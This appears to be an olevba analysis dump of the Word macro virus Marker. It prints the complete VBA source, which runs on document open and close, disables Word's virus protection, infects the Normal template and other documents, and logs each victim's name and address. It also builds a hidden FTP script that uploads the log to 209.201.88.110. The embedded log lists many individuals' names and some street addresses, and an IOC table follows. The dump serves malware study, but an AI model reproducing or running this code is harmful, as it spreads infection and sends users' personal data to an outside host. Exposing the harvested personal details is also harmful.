olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-5283755fd9de5ed4f4158d39d98f75c61e81f884
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-5283755fd9de5ed4f4158d39d98f75c61e81f884 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Set newDocument = Documents(1)
    nextRoutine = "Document_Open"
    
    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
    
    With nextDocument.VBProject.VBComponents
        For i = 1 To .Count
            If .Item(i).Type = 100 Then
                With .Item(i).CodeModule
                    If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                        With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                            codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                        End With
                    End If
                    .AddFromString codeString
                    .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                    If prevDocument Is NormalTemplate Then
                        .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                        .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                    Else
                        .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                        .ReplaceLine 6, "    Set nextDocument = newDocument"
                    End If
                End With
            End If
        Next
    End With
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:27:50 AM - Monday, 28 Dec 1998
' Marsha Spitz
' Marsha Spitz
' 6th Floor
' Blue Cross and Blue Shield Assn.
' 225 N. Michigan Ave.
' Chicago, IL  60601



' 04:30:23 PM - Tuesday, 29 Dec 1998
' Anna Keyser
'



' 03:22:39 PM - Wednesday, 30 Dec 1998
' Barbara Allen
'



' 03:31:57 PM - Thursday, 7 Jan 1999
' BCBSA
'



' 10:11:44 AM - Monday, 11 Jan 1999
' Harold S. Cooper, F. S. A.
'



' 04:56:46 PM - Wednesday, 20 Jan 1999
' Brian M. Septon
'



' 09:38:23 AM - Tuesday, 26 Jan 1999
' Atul Agarkar
'



' 12:55:40 PM - Wednesday, 27 Jan 1999
' J&G Holland
'



' 04:35:39 PM - Tuesday, 2 Feb 1999
' Srinivas Polavarapu
'



' 02:45:07 PM - Wednesday, 17 Feb 1999
' JACK
'



' 02:19:33 PM - Wednesday, 24 Feb 1999
' Binu John
'



' 01:52:58 PM - Tuesday, 23 Mar 1999
' SPG
'



' 01:50:56 PM - Wednesday, 24 Mar 1999
' SPG
'



' 09:45:13 AM - Tuesday, 6 Apr 1999
' lemax
'



' 04:59:11 PM - Tuesday, 6 Apr 1999
' Lalit Gupta
'



' 11:14:14 AM - Friday, 9 Apr 1999
' Mr JAISWAL
' kailash colony A-20.
' NEW DELHI-48.



' 12:48:11 PM - Thursday, 13 May 1999
' user6
'



' 12:58:42 PM - Monday, 9 Aug 1999
' reception
'



' 08:33:31 PM - Friday, 13 Aug 1999
' MRsantosh kumar sahoo
'



' 03:03:38 PM - Tuesday, 31 Aug 1999
' A.Sada.Siva.Sarma
' STG
' CEERI Centre New Delhi
' CSIR Copmplex
' Dr.K.S.Krishnan Road
' New Delhi 110012



' 07:58:03 PM - Monday, 13 Sep 1999
' atinternet
'



' 11:40:04 PM - Friday, 7 Jul 2000
' amit
'



' 04:21:03 AM - Friday, 12 Jan 2001
' Tiger
'



' 12:05:32 PM - Wednesday, 31 Jan 2001
' Mr. Ved ( EDP Admin..........
'



' 11:14:07 AM - Monday, 5 Mar 2001
' Tiger
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

